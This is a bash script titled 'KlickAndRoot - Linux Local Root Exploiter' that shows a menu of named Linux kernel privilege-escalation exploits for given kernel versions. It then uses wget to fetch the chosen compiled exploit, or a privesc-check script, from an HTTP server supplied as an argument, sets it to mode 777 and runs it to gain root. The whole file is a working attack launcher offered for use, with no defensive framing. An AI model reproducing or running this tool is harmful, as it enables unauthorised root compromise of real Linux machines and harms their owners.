#!/bin/bash

if [ -z "$1" ] 
	then 
		echo "Usage: " $0  "http-server-ip"
		exit
fi

echo "##############################################"
echo "########## Copyright © DarkPringles ##########"
echo "##############################################"
echo ""
echo "----------------------------------------------"
echo "   KlickAndRoot - Linux Local Root Exploiter  "
echo "----------------------------------------------"
echo "Version: 1.3"
echo ""
echo "[*] Your Kernel: "
uname -a
echo ""
echo "List of Exploits"
echo ""
echo "[1] nelson local priv esc (<= 2.6.37)(ED: 15704)"
echo "[2] ip_append_data() local ring0 root exploit (2.6 < 2.6.19)"
echo "[3] fs/pipe.c local kernel root(kit?) exploit (2.6.x)"
echo "[4] cups remote/local exploit (cups < 1.1.17)(use with -t 127.0.0.1)"
echo "[5] sock_sendpage() Local Root Exploit (2.4/2.6)"
echo "[8] ptrace_attach privilege escalation exploit (2.6.29)"
echo "[11] vmsplice Local Root Exploit (2.6.23 - 2.6.24)"
echo "[12] ftruncate()/open() Local Exploit (< 2.6.22)"
echo "[13] RDS privilege escalation exploit (>= 2.6.30)"
echo "[14] Mempodipper local root exploit (>=2.6.39, 32-bit)"
echo "[15] CAN BCM Privilege Escalation Exploit (< 2.6.36)"
echo "[16] PERF_EVENTS - Local Root Exploit (= 2.6.32 - 3.8.10 x86_64)"
echo "[17] ia32syscall Emulation Local Root (< 2.6.36 x86_64)"
echo "[18] perf_swevent_init Local root Exploit (< 3.8.9 x86_64)"
echo "---------------------------------------------------------------------"
echo "[88] Unix Priv-Esc-Check Script"
echo "[99] Source Download"
echo ""
echo "[*] Choose your Exploit(Number): "
read nr

if [ $nr -eq 88 ]
	then
	echo "[*] Downloading Script ..."
	wget -q http://${1}/KlickAndRoot/unix-privesc-check
	echo "[*] Set Permissions ..."
	chmod 777 unix-privesc-check
	echo "[*] Execute Script ... wait for finish ..."
	./unix-privesc-check standard >> output.txt
	echo "[*] Execution completed. Output file is: output.txt"
	echo "[*] Cleaning directory ..."
	rm -f unix-privesc-check
	echo "[*] Searching for problems ..."
	echo ""	
	cat output.txt | grep WARNING:
	exit
fi

if [ $nr -eq 99 ] 
        then
        echo "[*] Choose your Exploit Source(Number): "
	read snr
	echo "[*] Cleaning directory ..."
	rm -f local*
	echo "[*] Downloading Exploit ..."
	wget -q http://${1}/KlickAndRoot/local${snr}.c
	echo "[*] Exploit named: local"${snr}.c
	exit 
fi

echo "[*] Cleaning directory ..."
rm -f local*
echo "[*] Downloading Exploit ..."
wget -q http://${1}/KlickAndRoot/local${nr}
echo "[*] Set Permissions ..."
chmod 777 local${nr}
echo "[*] Execute Exploit ..."
echo ""
./local${nr}
